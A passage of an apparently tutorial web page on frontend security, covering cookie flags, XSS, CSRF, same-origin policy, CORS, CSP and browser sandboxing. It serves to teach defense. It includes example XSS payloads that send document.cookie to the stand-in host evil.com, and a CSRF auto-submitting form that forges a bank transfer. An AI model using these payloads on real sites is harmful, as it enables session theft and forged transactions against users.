+<li><strong>Cross-tab leakage:</strong> Browser APIs like <code>localStorage</code>, <code>sessionStorage</code>, and <code>SharedWorker</code> can be accessed across tabs from the same origin — a compromised script in one tab can exfiltrate data from another.</li>
+<li><strong>Clickjacking:</strong> Embedding your page inside a hidden <code>&lt;iframe&gt;</code> on an attacker's page, tricking the user into clicking UI elements on your site while thinking they are clicking on something else.</li>
+<li><strong>Defense:</strong> <code>X-Frame-Options: DENY</code> or <code>Content-Security-Policy: frame-ancestors 'none'</code> response headers.</li>
+</ul>
+<hr />
+<h2 id="22-cookie-security-privacy">2.2 Cookie Security &amp; Privacy</h2>
+<p>Cookies are small pieces of data stored in the browser that websites use to maintain state across stateless HTTP requests.</p>
+<h3 id="session-cookies-vs-permanent-persistent-cookies">Session Cookies vs Permanent / Persistent Cookies</h3>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Session Cookie</th>
+<th>Persistent Cookie</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Lifespan</strong></td>
+<td>Deleted when the browser closes</td>
+<td>Survives browser close; lives until <code>Expires</code> / <code>Max-Age</code></td>
+</tr>
+<tr>
+<td><strong>Use case</strong></td>
+<td>Login sessions, shopping cart</td>
+<td>"Remember Me", user preferences, long-term tracking</td>
+</tr>
+<tr>
+<td><strong>Risk</strong></td>
+<td>Stolen if session hijacking occurs</td>
+<td>Long-lived = longer window for theft/tracking</td>
+</tr>
+<tr>
+<td><strong>GDPR implication</strong></td>
+<td>Generally exempt from consent requirement (functional)</td>
+<td>Often requires explicit user consent (especially for tracking)</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>"Remember Me" authentication:</strong> Sets a long-lived persistent cookie (sometimes valid for 30–90 days) so users stay logged in. This cookie is a <strong>high-value target</strong> — if stolen, the attacker can impersonate the user for weeks.</li>
+<li><strong>GDPR Consent Banners:</strong> Those cookie pop-ups exist because GDPR requires explicit consent before setting non-essential (e.g., tracking/analytics) cookies. Strictly necessary cookies (session management) are exempt.</li>
+</ul>
+<h3 id="cookie-security-flags">Cookie Security Flags</h3>
+<p>Cookies can be made more secure using <strong>security attributes</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it does</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HttpOnly</code></td>
+<td>Cookie is inaccessible to JavaScript (<code>document.cookie</code>)</td>
+<td>Prevents cookie theft via XSS</td>
+</tr>
+<tr>
+<td><code>Secure</code></td>
+<td>Cookie only sent over HTTPS connections</td>
+<td>Prevents cookie interception on plain HTTP</td>
+</tr>
+<tr>
+<td><code>SameSite=Strict</code></td>
+<td>Cookie only sent for same-site requests</td>
+<td>Prevents CSRF attacks</td>
+</tr>
+<tr>
+<td><code>SameSite=Lax</code></td>
+<td>Cookie sent for same-site + top-level navigation from other sites</td>
+<td>A balance between security and usability</td>
+</tr>
+<tr>
+<td><code>SameSite=None; Secure</code></td>
+<td>Cookie sent for all cross-site requests (must be Secure)</td>
+<td>Required for legitimate third-party use cases (e.g., embedded iframes)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>⚠️ <strong>Best practice:</strong> All session/auth cookies should have <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite=Strict</code> (or <code>Lax</code>) at minimum.</p>
+</blockquote>
+<h3 id="first-party-vs-third-party-cookies">First-Party vs Third-Party Cookies</h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>First-Party Cookie</th>
+<th>Third-Party Cookie</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Set by</strong></td>
+<td>The domain you are visiting</td>
+<td>A different domain (e.g., ad network, analytics) whose scripts run on the page</td>
+</tr>
+<tr>
+<td><strong>Purpose</strong></td>
+<td>Session management, preferences, login state</td>
+<td>Cross-site behavioral tracking, ad targeting</td>
+</tr>
+<tr>
+<td><strong>User awareness</strong></td>
+<td>Generally expected and accepted</td>
+<td>Often invisible and non-consensual</td>
+</tr>
+<tr>
+<td><strong>Regulation</strong></td>
+<td>Largely functional; usually exempt</td>
+<td>Requires consent under GDPR; being phased out by browsers</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><strong>Browser Phase-out of Third-Party Cookies:</strong></li>
+<li><strong>Safari (ITP — Intelligent Tracking Prevention):</strong> Blocks third-party cookies by default since 2017.</li>
+<li><strong>Firefox:</strong> Blocks third-party cookies by default since 2019.</li>
+<li><strong>Chrome:</strong> Announced plans to deprecate third-party cookies (delayed multiple times, now targeting 2025+). The largest ad platform resisting the change it is simultaneously pushing.</li>
+<li><strong>Tracking without cookies (post-cookie tracking):</strong></li>
+<li>Device fingerprinting (no cookie needed).</li>
+<li>First-party data strategies (login walls, newsletter subscriptions).</li>
+<li>Google's Privacy Sandbox proposals (Topics API, FLEDGE) — controversial alternatives.</li>
+</ul>
+<hr />
+<h2 id="23-web-application-vulnerabilities-client-attacks">2.3 Web Application Vulnerabilities &amp; Client Attacks</h2>
+<h3 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h3>
+<p><strong>Definition:</strong> XSS is an attack where an attacker injects malicious JavaScript into a web page that is then <strong>executed in the browsers of other users</strong>.</p>
+<p><strong>Why it's dangerous:</strong> JavaScript executing in a user's browser has access to:
+- All cookies for that domain (unless <code>HttpOnly</code>).
+- The full DOM — everything the user sees.
+- The user's keystrokes, clipboard, form input.
+- Can make authenticated requests on behalf of the user.
+- Can redirect the user to phishing pages.</p>
+<h4 id="type-1-reflected-xss-non-persistent">Type 1: Reflected XSS (Non-Persistent)</h4>
+<ul>
+<li><strong>How it works:</strong> Malicious script is embedded in a URL (query parameter, path, etc.). The server reflects this input back in the HTML response without sanitization. The victim clicks a crafted link.</li>
+<li><strong>Attack flow:</strong></li>
+<li>Attacker crafts a URL: <code>https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code></li>
+<li>Victim clicks the link (sent via phishing email, social media, etc.).</li>
+<li>Server reflects the <code>q</code> parameter into the response HTML.</li>
+<li>Browser executes the injected script.</li>
+<li>Victim's cookies are sent to <code>evil.com</code>.</li>
+<li><strong>Key characteristic:</strong> The payload is in the URL and only affects the user who clicks that specific link. Not stored server-side.</li>
+</ul>
+<h4 id="type-2-stored-xss-persistent">Type 2: Stored XSS (Persistent)</h4>
+<ul>
+<li><strong>How it works:</strong> Malicious script is submitted and <strong>stored in the database</strong> (e.g., in a forum post, comment, username, profile bio). Every user who views that content has the script executed in their browser.</li>
+<li><strong>Attack flow:</strong></li>
+<li>Attacker posts a comment: <code>Nice article! &lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code></li>
+<li>Server stores this in the database without sanitization.</li>
+<li>Every user who loads the comment page gets the script executed.</li>
+<li>All their cookies are exfiltrated to <code>evil.com</code>.</li>
+<li><strong>Key characteristic:</strong> One injection affects <strong>all users</strong> — far more dangerous than Reflected XSS. Classic example: the <strong>Samy worm</strong> (2005) on MySpace spread as a Stored XSS worm and infected 1 million profiles in 20 hours.</li>
+</ul>
+<h4 id="type-3-dom-based-xss">Type 3: DOM-Based XSS</h4>
+<ul>
+<li>The server sends a safe response, but <strong>client-side JavaScript</strong> unsafely reads attacker-controlled data (e.g., <code>location.hash</code>, <code>document.referrer</code>) and injects it into the DOM.</li>
+<li>The payload never touches the server — purely a client-side vulnerability.</li>
+</ul>
+<h4 id="xss-defenses">XSS Defenses</h4>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Server-side input validation</strong></td>
+<td>Reject inputs containing unexpected characters at the API/server layer</td>
+</tr>
+<tr>
+<td><strong>Server-side output encoding</strong></td>
+<td>HTML-encode all user-supplied data before inserting into HTML (<code>&amp;lt;</code> instead of <code>&lt;</code>)</td>
+</tr>
+<tr>
+<td><strong>Use safe DOM APIs</strong></td>
+<td>Use <code>textContent</code> instead of <code>innerHTML</code>; avoid <code>eval()</code>, <code>document.write()</code></td>
+</tr>
+<tr>
+<td><strong>Content Security Policy (CSP)</strong></td>
+<td>Browser-enforced policy that blocks inline scripts and restricts script sources (see Section 2.4)</td>
+</tr>
+<tr>
+<td><strong>HttpOnly cookies</strong></td>
+<td>Prevents XSS from stealing session cookies even if script runs</td>
+</tr>
+<tr>
+<td><strong>Sanitization libraries</strong></td>
+<td>Use battle-tested libraries like DOMPurify for any situation where HTML must be rendered</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>⚠️ <strong>Golden rule:</strong> Never trust user input. Validate on input, encode on output.</p>
+</blockquote>
+<hr />
+<h3 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h3>
+<p><strong>Definition:</strong> CSRF is an attack where a malicious website <strong>tricks the user's browser into making an authenticated request</strong> to a different website where the user is already logged in.</p>
+<p><strong>Why it works:</strong> Browsers automatically attach cookies (including session cookies) to every request made to a domain — including requests triggered by a different, malicious website.</p>
+<h4 id="attack-mechanics">Attack Mechanics</h4>
+<p><strong>Scenario:</strong> A user is logged into their bank (<code>mybank.com</code>). The attacker tricks them into visiting <code>evil.com</code>.</p>
+<ol>
+<li>User is logged into <code>mybank.com</code> — their browser holds a valid session cookie.</li>
+<li>User visits <code>evil.com</code> (e.g., via phishing link).</li>
+<li><code>evil.com</code> contains a hidden form or image tag:
+   <div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Hidden image tag that triggers a GET request --&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://mybank.com/transfer?to=attacker&amp;amount=10000"</span><span class="p">&gt;</span>
+
+<span class="cm">&lt;!-- Or a form that auto-submits --&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://mybank.com/transfer"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"to"</span> <span class="na">value</span><span class="o">=</span><span class="s">"attacker_account"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"amount"</span> <span class="na">value</span><span class="o">=</span><span class="s">"10000"</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></li>
+<li>The browser sends the request to <code>mybank.com</code> <strong>with the user's session cookie</strong> attached automatically.</li>
+<li><code>mybank.com</code> sees a valid, authenticated request and executes the transfer.</li>
+</ol>
+<p><strong>Key distinction from XSS:</strong> CSRF exploits the <strong>trust the server has in the browser</strong> (the browser's session cookie). XSS exploits the <strong>trust the browser has in the server</strong> (executing server-returned scripts).</p>
+<h4 id="csrf-defenses">CSRF Defenses</h4>
+<p><strong>1. Anti-CSRF Tokens (Synchronizer Token Pattern) — Primary Defense</strong>
+- The server generates a <strong>unique, unpredictable, cryptographically random token</strong> for each session (or each form).
+- The token is embedded as a hidden field in every state-changing form.
+- On form submission, the server validates that the token matches.
+- A cross-site attacker <strong>cannot read the token</strong> (Same-Origin Policy prevents cross-origin page reads), so they cannot forge a valid request.</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"/transfer"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"csrf_token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"a9f3k2...randomtoken...x8j1"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"amount"</span> <span class="na">value</span><span class="o">=</span><span class="s">"100"</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>Transfer<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Token requirements: <strong>unique per session</strong> (or per request), <strong>cryptographically secure random</strong>, <strong>time-limited</strong> (expire after N minutes).</p>
+<p><strong>2. <code>SameSite</code> Cookie Attribute</strong>
+- <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on session cookies prevents them from being sent on cross-site requests.
+- This is now the <strong>simplest and most effective</strong> first line of defense.
+- Modern browsers set <code>SameSite=Lax</code> by default for cookies that don't specify the attribute.</p>
+<p><strong>3. Double Submit Cookie Pattern</strong>
+- A random value is sent both as a cookie and as a request parameter.
+- Server validates that the two match.
+- Attacker cannot read the cookie value from a cross-origin page.</p>
+<p><strong>4. Custom Request Headers</strong>
+- AJAX requests can include a custom header (e.g., <code>X-Requested-With: XMLHttpRequest</code>).
+- Browsers enforce the Same-Origin Policy for custom headers — cross-site requests cannot set them.</p>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>Protects Against</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Anti-CSRF Token</strong></td>
+<td>CSRF</td>
+<td>Gold standard; required for older browsers</td>
+</tr>
+<tr>
+<td><strong><code>SameSite=Strict</code></strong></td>
+<td>CSRF</td>
+<td>Best modern approach; may break some flows</td>
+</tr>
+<tr>
+<td><strong><code>SameSite=Lax</code></strong></td>
+<td>Most CSRF</td>
+<td>Default in modern browsers; allows top-level GETs</td>
+</tr>
+<tr>
+<td><strong>Custom Header</strong></td>
+<td>CSRF via AJAX</td>
+<td>Works for XHR/fetch; not for form submissions</td>
+</tr>
+<tr>
+<td><strong>Referer/Origin Validation</strong></td>
+<td>Some CSRF</td>
+<td>Fragile; can be stripped by proxies</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="24-browser-security-mechanisms-policies">2.4 Browser Security Mechanisms &amp; Policies</h2>
+<h3 id="same-origin-policy-sop">Same-Origin Policy (SOP)</h3>
+<p><strong>Definition:</strong> The Same-Origin Policy is the browser's fundamental security boundary. It restricts how documents and scripts from one <strong>origin</strong> can interact with resources from a different origin.</p>
+<p><strong>Origin = Protocol + Hostname + Port</strong></p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>Same origin as <code>https://example.com:443</code>?</th>
+<th>Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>https://example.com/page</code></td>
+<td>✅ Yes</td>
+<td>Same protocol, host, port</td>
+</tr>
+<tr>
+<td><code>http://example.com</code></td>
+<td>❌ No</td>
+<td>Different protocol (http vs https)</td>
+</tr>
+<tr>
+<td><code>https://api.example.com</code></td>
+<td>❌ No</td>
+<td>Different subdomain</td>
+</tr>
+<tr>
+<td><code>https://example.com:8080</code></td>
+<td>❌ No</td>
+<td>Different port</td>
+</tr>
+<tr>
+<td><code>https://other.com</code></td>
+<td>❌ No</td>
+<td>Different host</td>
+</tr>
+</tbody>
+</table>
+<p><strong>What SOP prevents:</strong>
+- A script on <code>evil.com</code> cannot read the DOM or response of <code>mybank.com</code>.
+- A script on <code>evil.com</code> cannot read cookies from <code>mybank.com</code>.
+- A script on <code>evil.com</code> cannot make and read the response of authenticated requests to <code>mybank.com</code>.</p>
+<blockquote>
+<p>Note: SOP prevents <strong>reading</strong> cross-origin responses. It does NOT prevent cross-origin requests from being <em>sent</em> — which is why CSRF is still possible (browser sends the request, but <code>evil.com</code> can't read the response).</p>
+</blockquote>
+<hr />
+<h3 id="cross-origin-resource-sharing-cors">Cross-Origin Resource Sharing (CORS)</h3>
+<p><strong>The problem CORS solves:</strong> Modern web apps legitimately need to make cross-origin requests. E.g., your frontend at <code>https://app.example.com</code> needs to call your API at <code>https://api.example.com</code>. SOP blocks this by default.</p>
+<p><strong>How CORS works:</strong> The server explicitly tells the browser which cross-origins are allowed to read its responses using HTTP response headers.</p>
+<p><strong>CORS Headers:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>Example Value</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Access-Control-Allow-Origin</code></td>
+<td><code>https://app.example.com</code></td>
+<td>Which origins may access this resource</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Methods</code></td>
+<td><code>GET, POST, PUT</code></td>
+<td>Which HTTP methods are allowed</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Headers</code></td>
+<td><code>Content-Type, Authorization</code></td>
+<td>Which request headers are allowed</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Credentials</code></td>
+<td><code>true</code></td>
+<td>Whether cookies/auth headers may be sent</td>
+</tr>
+<tr>
+<td><code>Access-Control-Max-Age</code></td>
+<td><code>3600</code></td>
+<td>How long the browser can cache preflight results</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The Preflight Request:</strong>
+For "non-simple" requests (e.g., POST with JSON body, custom headers), the browser first sends an <code>OPTIONS</code> request to check if the actual request is permitted:
+<div class="highlight"><pre><span></span><code>OPTIONS /api/data HTTP/1.1
+Origin: https://app.example.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type
+</code></pre></div>
+Server responds with the allowed configuration, and only then does the browser send the actual request.</p>
+<p><strong>Common CORS Misconfigurations:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Misconfiguration</th>
+<th>Problem</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Access-Control-Allow-Origin: *</code></td>
+<td>Allows any site to read responses — dangerous for authenticated endpoints</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Origin: *</code> + <code>Credentials: true</code></td>
+<td><strong>Invalid</strong> — browsers reject this combination, but some workarounds exist</td>
+</tr>
+<tr>
+<td>Reflecting <code>Origin</code> header blindly</td>
+<td><code>Origin: evil.com</code> → <code>Access-Control-Allow-Origin: evil.com</code> — makes CORS useless</td>
+</tr>
+<tr>
+<td>Allowlisting with weak regex</td>
+<td><code>origin.endsWith('example.com')</code> allows <code>evil-example.com</code></td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>⚠️ <strong>Rule:</strong> Never use <code>Access-Control-Allow-Origin: *</code> for authenticated APIs. Always allowlist specific trusted origins.</p>
+</blockquote>
+<hr />
+<h3 id="content-security-policy-csp">Content Security Policy (CSP)</h3>
+<p><strong>Definition:</strong> CSP is an HTTP response header (or <code>&lt;meta&gt;</code> tag) that tells the browser <strong>exactly what resources are allowed to load and execute</strong> on a page. It is the most powerful browser-enforced defense against XSS.</p>
+<p><strong>How it works:</strong>
+<div class="highlight"><pre><span></span><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; img-src *; style-src 'self' 'unsafe-inline'
+</code></pre></div></p>
+<p><strong>CSP Directives:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Controls</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>default-src</code></td>
+<td>Fallback for all resource types not explicitly listed</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>Where JavaScript can be loaded from</td>
+</tr>
+<tr>
+<td><code>style-src</code></td>
+<td>Where CSS can be loaded from</td>
+</tr>
+<tr>
+<td><code>img-src</code></td>
+<td>Where images can be loaded from</td>
+</tr>
+<tr>
+<td><code>connect-src</code></td>
+<td>Which URLs can be contacted via XHR, Fetch, WebSocket</td>
+</tr>
+<tr>
+<td><code>font-src</code></td>
+<td>Where fonts can be loaded from</td>
+</tr>
+<tr>
+<td><code>frame-src</code></td>
+<td>Which origins can be embedded in iframes</td>
+</tr>
+<tr>
+<td><code>form-action</code></td>
+<td>Where forms can submit data</td>
+</tr>
+<tr>
+<td><code>frame-ancestors</code></td>
+<td>Which pages can embed this page (replaces <code>X-Frame-Options</code>)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>CSP Source Values:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>'self'</code></td>
+<td>Same origin only</td>
+</tr>
+<tr>
+<td><code>'none'</code></td>
+<td>No sources allowed</td>
+</tr>
+<tr>
+<td><code>https://cdn.example.com</code></td>
+<td>Specific external domain</td>
+</tr>
+<tr>
+<td><code>'unsafe-inline'</code></td>
+<td>Allow inline scripts/styles — <strong>defeats much of CSP's value</strong></td>
+</tr>
+<tr>
+<td><code>'unsafe-eval'</code></td>
+<td>Allow <code>eval()</code> — <strong>avoid if possible</strong></td>
+</tr>
+<tr>
+<td><code>'nonce-{random}'</code></td>
+<td>Allow specific inline scripts with matching nonce attribute</td>
+</tr>
+<tr>
+<td><code>'sha256-{hash}'</code></td>
+<td>Allow specific inline scripts by their content hash</td>
+</tr>
+</tbody>
+</table>
+<p><strong>CSP Report-Only Mode:</strong> (<code>Content-Security-Policy-Report-Only</code>)
+- Policy is <strong>not enforced</strong> — violations are only reported to a specified endpoint.
+- Useful for testing a CSP policy before enforcing it in production.</p>
+<p><strong>Impact of CSP:</strong>
+- Even if an XSS injection succeeds, CSP prevents the injected script from loading remote payloads or exfiltrating data to unauthorized domains.
+- Nonce-based CSP effectively eliminates injected <code>&lt;script&gt;</code> tags since the attacker cannot know the server-generated nonce.</p>
+<hr />
+<h3 id="secure-contexts">Secure Contexts</h3>
+<p><strong>Definition:</strong> A <strong>Secure Context</strong> is an origin that has been delivered over HTTPS (or from <code>localhost</code>). Modern browsers restrict access to powerful web APIs only to secure contexts.</p>
+<p><strong>APIs restricted to secure contexts:</strong></p>
+<table>
+<thead>
+<tr>
+<th>API</th>
+<th>Why it needs HTTPS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Service Workers</strong></td>
+<td>Can intercept all network requests; would be extremely dangerous over HTTP</td>
+</tr>
+<tr>
+<td><strong>Geolocation API</strong></td>
+<td>Physical location data; must be protected</td>
+</tr>
+<tr>
+<td><strong>Camera / Microphone (getUserMedia)</strong></td>
+<td>Sensitive input; must not be interceptable</td>
+</tr>
+<tr>
+<td><strong>Web Bluetooth / USB</strong></td>
+<td>Direct hardware access</td>
+</tr>
+<tr>
+<td><strong>Payment Request API</strong></td>
+<td>Financial transactions</td>
+</tr>
+<tr>
+<td><strong>Web Crypto API</strong></td>
+<td>Cryptographic operations</td>
+</tr>
+<tr>
+<td><strong>Push Notifications</strong></td>
+<td>Must be authorized by the real site, not a MitM</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Why this matters:</strong> If your site serves over plain HTTP, a network attacker (e.g., on the same Wi-Fi) can intercept and modify any page content — potentially injecting scripts. Restricting powerful APIs to HTTPS ensures that these capabilities cannot be hijacked.</p>
+<p><strong>Practical implication:</strong> In 2024, <strong>HTTPS is mandatory for any modern web app</strong>. All major browser features, PWA capabilities, and security policies require it. HTTP is effectively a development-only protocol.</p>
+<hr />
+<h3 id="browser-sandboxing">Browser Sandboxing</h3>
+<p><strong>Definition:</strong> Modern browsers run each tab (and often each iframe/extension) in a <strong>separate sandboxed process</strong>, isolated from the host operating system and from each other.</p>
+<p><strong>How it works (Chromium multi-process architecture):</strong>
+- <strong>Browser Process:</strong> Manages UI, coordinates other processes. Has OS-level privileges.
+- <strong>Renderer Process:</strong> Runs web content (HTML, CSS, JS). Runs with <strong>minimal OS privileges</strong> in a sandbox — cannot directly access the filesystem, network sockets, or OS APIs.
+- <strong>GPU Process:</strong> Handles graphics; sandboxed separately.
+- <strong>Network Process:</strong> Handles network requests; separate.</p>
+<p><strong>What sandboxing prevents:</strong>
+- A compromised web page cannot directly read files from your computer.
+- A compromised web page cannot make raw socket connections.
+- A compromised web page cannot execute arbitrary OS commands.
+- Malicious content in one tab cannot directly access content or memory of another tab from a different origin.</p>
+<p><strong>Limitations of sandboxing:</strong>
+- <strong>Sandbox escapes:</strong> Vulnerabilities in the browser's own code can allow a renderer process to break out of the sandbox. These are among the most critical (and valuable) browser vulnerabilities.
+- <strong>Spectre / Meltdown (2018):</strong> CPU-level speculative execution vulnerabilities allowed JavaScript in one browser process to potentially read memory from other processes — a fundamental limit of process isolation on shared CPU architectures.
+  - <strong>Browser response:</strong> Reduced timer resolution, disabled <code>SharedArrayBuffer</code> temporarily, introduced cross-origin isolation headers (<code>Cross-Origin-Opener-Policy</code>, <code>Cross-Origin-Embedder-Policy</code>).</p>
+<hr />
+<h2 id="25-frontend-security-summary-best-practices">2.5 Frontend Security Summary &amp; Best Practices</h2>
+<table>
+<thead>
+<tr>
+<th>Area</th>
+<th>Key Security Practice</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Cookies</strong></td>
+<td>Always use <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Strict/Lax</code></td>
+</tr>
+<tr>
+<td><strong>XSS Prevention</strong></td>
+<td>Validate input, encode output, use CSP, avoid <code>innerHTML</code> / <code>eval()</code></td>
+</tr>
+<tr>
+<td><strong>CSRF Prevention</strong></td>
+<td>Use <code>SameSite</code> cookies + Anti-CSRF tokens for state-changing operations</td>
+</tr>
+<tr>
+<td><strong>CORS</strong></td>
+<td>Explicitly allowlist trusted origins; never use <code>*</code> for authenticated APIs</td>
+</tr>
+<tr>
+<td><strong>CSP</strong></td>
+<td>Deploy a strict policy; use nonces for inline scripts; use Report-Only to test</td>
+</tr>
+<tr>
+<td><strong>HTTPS</strong></td>
+<td>Mandatory for all production apps; enables Secure Contexts and modern APIs</td>
+</tr>
+<tr>
+<td><strong>Third-Party Scripts</strong></td>
+<td>Minimize; use SRI hashes; self-host where possible</td>
+</tr>
+<tr>
+<td><strong>Clickjacking</strong></td>
+<td>Use <code>Content-Security-Policy: frame-ancestors 'none'</code></td>
+</tr>
+<tr>
+<td><strong>Sandboxing iframes</strong></td>
+<td>Use the <code>sandbox</code> attribute on <code>&lt;iframe&gt;</code> to restrict capabilities</td>
+</tr>
+<tr>
+<td><strong>Input Validation</strong></td>
+<td>Always re-validate on the server — frontend validation is for UX only</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>💡 <strong>Layered Defense:</strong> No single mechanism is sufficient. Stack multiple defenses: <code>SameSite</code> cookies + CSRF tokens + CSP + input sanitization work together. If one layer fails, others still protect the user.</p>
+</blockquote>
+<hr />
+<p><em>← <a href="../01_fundamentals_privacy_vs_security/">Section 1: Fundamentals</a> | Next → Section 3: Backend Security</em></p>
+<h2 id="further-practice">Further practice</h2>
+<ul>
+<li>Revisit the examples in this topic and explain each step in your own words.</li>
+<li>Identify one place where the concept could be used in a web application.</li>
+<li>Test a small variation and note how the behavior changes.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../01_fundamentals_privacy_vs_security/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Privacy versus security">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Privacy versus security
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../03_backend_security/" class="md-footer__link md-footer__link--next" aria-label="Next: Backend security">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Backend security
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
